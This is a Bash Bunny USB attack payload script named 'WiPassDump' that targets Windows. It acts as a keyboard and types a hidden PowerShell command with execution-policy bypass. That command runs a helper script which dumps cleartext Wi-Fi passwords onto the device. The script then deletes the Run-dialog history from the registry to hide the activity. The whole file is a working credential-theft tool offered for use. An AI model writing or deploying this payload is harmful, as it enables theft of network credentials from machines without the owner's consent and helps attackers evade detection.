#!/bin/bash
#
# Title:         WiPassDump
# Author:        samdeg555
# Edited by:     viperguy07
# Version:       1.2
# Target:        Windows
# 
# Runs powershell as Administrator in hidden mode
# Dumps cleartext Wi-Fi passwords and infos to the Bash Bunny
# Clean up tracks
# Options
#  - Line 16 clean tracks yes or no
#  - Line 28 set keyboard language
#
# Do you want to clean your tracks
CLEARTRACKS="yes" # yes or no

LED R 200

# Create directory to dump infos
mkdir -p /root/udisk/loot/WiPassDump

# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
source bunny_helpers.sh

# Set language accordingly 'us' for United States
Q SET_LANGUAGE ca

ATTACKMODE HID STORAGE

LED B 200

# Launch powershell as admin and hidden
Q GUI r
Q DELAY 1000
Q STRING powershell -WindowStyle Hidden -exec bypass '.((gwmi win32_volume -f '"'"'label='"''"'BashBunny'"'''"').Name+'"'"'payloads/'$SWITCH_POSITION'/a.cmd'"'"')'
Q ENTER
Q DELAY 500

# Wait for a.cmd to finish and exit

LED R B 500

Q DELAY 3000

# Clear tracks?
if [ $CLEARTRACKS == "yes" ]; then
   Q DELAY 500
   Q GUI r
   Q DELAY 500
   Q STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
   Q ENTER
fi

sync

LED G